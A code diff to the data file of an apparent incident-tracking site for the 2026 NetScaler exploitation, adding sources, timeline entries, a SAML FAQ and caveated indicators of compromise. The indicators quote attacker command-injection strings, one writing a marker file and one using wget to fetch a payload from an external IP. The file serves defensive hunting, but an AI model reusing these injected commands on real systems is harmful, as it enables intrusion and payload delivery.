@@ -10,6 +10,7 @@ var IFS = '$' + '{IFS}';
 /* pending: true = did not load in automated check at build time (29 Sep 2026). URL kept as supplied. */
 var SOURCES = {
   citrix:      { cat: 'official', label: 'Citrix - CTX697096 security bulletin (Sep 27)', url: 'https://support.citrix.com/external/article/CTX697096/citrix-netscaler-adc-and-citrix-netscale.html' },
+  citrixsaml:  { cat: 'official', label: 'Citrix community blog - Security Update: Guidance for NetScaler SAML Authentication Deployments (Oct 2; new issue, independent of CTX697096)', url: 'https://community.citrix.com/techzone-blogs/110_security-updates/security-update-guidance-for-netscaler-saml-authentication-deployments/' },
   ctx694799:   { cat: 'official', label: 'Citrix - CTX694799 Steps to Take if NetScaler ADC is Suspected to be Compromised', url: 'https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html' },
   citrixblog:  { cat: 'official', label: 'Citrix community blog - Security Bulletin for CVE-2026-88771 through CVE-2026-88778 (incl. IoC section; last updated Sep 30)', url: 'https://community.citrix.com/techzone-blogs/110_security-updates/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve-2026-88771-through-cve-2026-88778/', pending: true },
   citrixreddit: { cat: 'official', label: 'Citrix (CTX-Michael) on r/Citrix, Sep 27 - CRITICAL UPDATE announcement', url: 'https://www.reddit.com/r/Citrix/comments/1wro1yf/critical_update_citrix_netscaler_adc_and_citrix/' },
@@ -54,6 +55,8 @@ var SOURCES = {
   kb9:         { cat: 'beaumont', label: 'Beaumont, Sep 28 15:13 UTC - GitHub "PoCs" for the new Citrix vulns are "fake AI slop"', url: 'https://cyberplace.social/@GossiTheDog/117349313638958333' },
   kb10:        { cat: 'beaumont', label: 'Beaumont, Sep 29 18:32 UTC - Dutch government shuts down all Citrix NetScalers (relaying @bert_hubert)', url: 'https://cyberplace.social/@GossiTheDog/117355758746619146' },
   kb11:        { cat: 'beaumont', label: 'Beaumont, Oct 1 00:12 UTC - Arctic Wolf IoCs cover follow-up "spray and pray" activity, not the early-September actor', url: 'https://cyberplace.social/@GossiTheDog/117362758120876296' },
+  kb12:        { cat: 'beaumont', label: 'Beaumont, Oct 2 19:01 UTC - patched 13.1 and 14.1 honeypots are crashing; "we may have #PitScaler 2 on our hands"', url: 'https://cyberplace.social/@GossiTheDog/117372857146978531' },
+  kb13:        { cat: 'beaumont', label: 'Beaumont, Oct 2 20:00 UTC - Citrix has published a blog on the new SAML issue', url: 'https://cyberplace.social/@GossiTheDog/117373090409884785' },
   nlgov:       { cat: 'official', label: 'Dutch government letter to parliament - Kwetsbaarheden Citrix Netscaler (2026D47262, Sep 29)', url: 'https://www.tweedekamer.nl/kamerstukken/brieven_regering/detail?id=2026D47262&did=2026D47262' },
 
   cverec:      { cat: 'official', label: 'CVE.org - CVE-2026-88771 record (reserved Sep 10 07:14 UTC by NetScaler; published Sep 27 16:02 UTC)', url: 'https://www.cve.org/CVERecord?id=CVE-2026-88771' },
@@ -82,7 +85,7 @@ var SOURCES = {
   arcticwolf:  { cat: 'research', label: 'Arctic Wolf - Citrix NetScaler Active Exploitation via CVE-2026-88771 (IoC pack, Sep 30)', url: 'https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771' },
   sygnia:      { cat: 'research', label: 'Sygnia - Actively Exploited NetScaler Vulnerabilities (IR-based advisory, Sep 30)', url: 'https://www.sygnia.co/threat-reports-and-advisories/actively-exploited-netscaler-vulnerabilities/' },
   tenex:       { cat: 'research', label: 'TENEX - What TENEX Observed Inside Active Exploitation of CVE-2026-88771 (Sep 30)', url: 'https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/' },
-  poppchecker: { cat: 'research', label: 'Poppelgaard - NetScaler CTX697096 checker (free read-only script, v1.9 released Oct 1)', url: 'https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker' },
+  poppchecker: { cat: 'research', label: 'Poppelgaard - NetScaler CTX697096 checker (free read-only script; v1.9 Oct 1, v1.11 Oct 2)', url: 'https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker' },
   levelblue:   { cat: 'research', label: 'LevelBlue SpiderLabs (THOR team) - CVE-2026-88771 Observed Exploitation Artifacts and Hunt Indicators (Sep 30; own findings, not independently confirmed)', url: 'https://www.levelblue.com/blogs/spiderlabs-blog/citrix-netscaler-cve-2026-88771-observed-exploitation-artifacts-and-hunt-indicators' },
 
   censys:      { cat: 'telemetry', label: 'Censys advisory - NetScaler exposure (42,735 hosts, Sep 28)', url: 'https://censys.com/advisory/cve-2026-10747-2/' },
@@ -182,6 +185,11 @@ var CVES = [
 /* ---------- Timeline (UTC; time: null = no time given) ---------- */
 /* kind: official | research | telemetry | reported. approx: date is approximate. deadline: future deadline. */
 var TIMELINE = [
+  { date: '2026-10-02', time: '19:01', kind: 'reported', title: 'Beaumont: patched honeypots crash, "we may have PitScaler 2"',
+    body: 'Beaumont says his patched 13.1 and 14.1 honeypots are crashing, from multiple source IPs, and posts greps for authentication-daemon (nsaaad) crashes and pitboss restart messages in ns.log, one of them for 213.209.159.55. This is one researcher\'s observation: at the time it came with no CVE and no vendor or CERT statement.', cite: ['kb12'],
+    validated: 'Post text read directly on 2 Oct.' },
+  { date: '2026-10-02', time: null, kind: 'official', title: 'Citrix publishes guidance on a new SAML issue, independent of CTX697096',
+    body: 'Citrix says it is tracking a newly observed, configuration-dependent issue in customer-managed NetScaler deployments that use SAML authentication on a Gateway or AAA virtual server. An appliance is affected when its configuration contains add authentication samlAction or add authentication samlIdPProfile. Citrix says the issue is independent of CTX697096, plans a new security bulletin and product update, asks customers who see impact to contact Citrix Support, and asks all customers to upgrade once the bulletin is out. The post lists no CVE, affected versions or fixed builds yet. Beaumont links the post at 20:00 UTC.', cite: ['citrixsaml', 'kb13'] },
   { date: '2026-09-28', time: null, kind: 'official', title: 'CERT-FR, CSSF (Luxembourg) and CERT Quebec issue alerts',
     body: 'CERT-FR says the two vulnerabilities allow unauthenticated remote code execution, are actively exploited and were exploited before patches existed. The CSSF points supervised financial entities to the CIRCL report and reminds them that unauthenticated remote code execution is unauthorised access, so it counts as a major ICT-related incident to notify under DORA or its national circulars. CERT Quebec rates the risk critical (TLP:CLEAR) and says Quebec public bodies using a vulnerable product must test and deploy the vendor updates or mitigations.', cite: ['certfr', 'cssf', 'certqc'] },
   { date: '2026-09-30', time: null, kind: 'official', title: 'CERT-FR updates its alert with GTIG indicators',
@@ -654,7 +662,11 @@ var IOCS = [
   { type: 'File path', value: '/tmp/watchTowr', context: 'README example output path of the CVE-2026-88772 (DTLS) detection tool; the example writes a 7-byte file', caveat: 'Test marker from a public watchTowr detection tool (README example path). A hit means someone ran the tool, possibly a defender, not necessarily an attacker. The operator can choose any path.', cite: ['wt2tool'], share: 'Public GitHub repository, no TLP marking' },
   { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;printf wt88771mbw9drneqklf>/var/netscaler/logon/themes/wt88771mbw9drneqklf.txt;# X', context: 'Injected username that writes a marker file into the logon themes directory (execution test)', caveat: RD_CAVEAT, cite: ['redditasm'], share: RD_SHARE },
   { type: 'File path', value: '/var/netscaler/logon/themes/wt88771mbw9drneqklf.txt', context: 'Marker file created by the command above; hunt for wt88771*.txt under /var/netscaler/logon/themes/', caveat: RD_CAVEAT, cite: ['redditasm'], share: RD_SHARE },
-  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;wget http://31.56.197.72:9090/lula;# X', context: 'Payload retrieval from 31.56.197.72, also described by LevelBlue; the same host appears in the Arctic Wolf and TENEX data', caveat: RD_CAVEAT + ' The wget line itself matches LevelBlue\'s published example.', cite: ['redditasm', 'levelblue'], share: RD_SHARE }
+  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;wget http://31.56.197.72:9090/lula;# X', context: 'Payload retrieval from 31.56.197.72, also described by LevelBlue; the same host appears in the Arctic Wolf and TENEX data', caveat: RD_CAVEAT + ' The wget line itself matches LevelBlue\'s published example.', cite: ['redditasm', 'levelblue'], share: RD_SHARE },
+  { type: 'IPv4', value: '213.209.159.55', context: 'IP in the Beaumont ns.log grep on patched honeypots, 2 Oct (AS208137, Feo Prest SRL, Germany); shown as a source of traffic around the crashes', caveat: 'Single-researcher observation, unverified. The post gives no more context, and no vendor or CERT has confirmed the activity. A hunting lead, not a blocklist entry.', cite: ['kb12'], share: 'Public Mastodon post' },
+  { type: 'Config pattern', value: 'add authentication samlAction.*', context: 'Citrix: an appliance with this line (NetScaler as SAML service provider) on a Gateway or AAA virtual server is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
+  { type: 'Config pattern', value: 'add authentication samlIdPProfile.*', context: 'Citrix: an appliance with this line (NetScaler as SAML identity provider) is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
+  { type: 'Log pattern', value: 'proc nsaaad.*(SIGNALED|EXITED)|maximum number of restarts|Pitboss declaring system failure|All monitored processes have exited, rebooting', context: 'Grep from the Beaumont post for authentication-daemon crashes and the resulting restart or reboot, run against /var/log/ns.log', caveat: 'Beaumont own pattern. A match means the daemon crashed or the appliance restarted, which has other causes too; it is not proof of an attack.', cite: ['kb12'], share: 'Public Mastodon post' }
 ];
 
 /* ---------- Fixed builds, exactly as in CTX697096 ---------- */
@@ -667,6 +679,8 @@ var BUILDS = [
 
 /* ---------- FAQ: short sourced answers (also emitted as FAQPage JSON-LD) ---------- */
 var FAQ = [
+  { q: 'Is there a new NetScaler issue involving SAML?', cite: ['citrixsaml', 'kb12', 'kb13'],
+    a: 'Citrix published guidance on 2 Oct 2026 for a newly observed, configuration-dependent issue in NetScaler deployments that use SAML authentication on a Gateway or AAA virtual server. It says the issue is independent of CTX697096 and that a security bulletin and product update are planned. No CVE, affected versions or fixed builds were listed yet. Beaumont reports his patched honeypots crashing, which is one researcher\'s observation. This site covers CVE-2026-88771 and CVE-2026-88772; the SAML issue is not part of CTX697096.' },
   { q: 'What is PitScaler?', cite: ['kb4', 'citrix'],
     a: 'PitScaler is the name Kevin Beaumont gave on 28 Sep 2026 to the exploitation of Citrix NetScaler ADC and NetScaler Gateway zero-days CVE-2026-88771 and CVE-2026-88772. Citrix disclosed them, with six other CVEs, in bulletin CTX697096 on 27 Sep 2026.' },
   { q: 'Which NetScaler vulnerabilities are exploited?', cite: ['citrix', 'kev', 'kb1'],
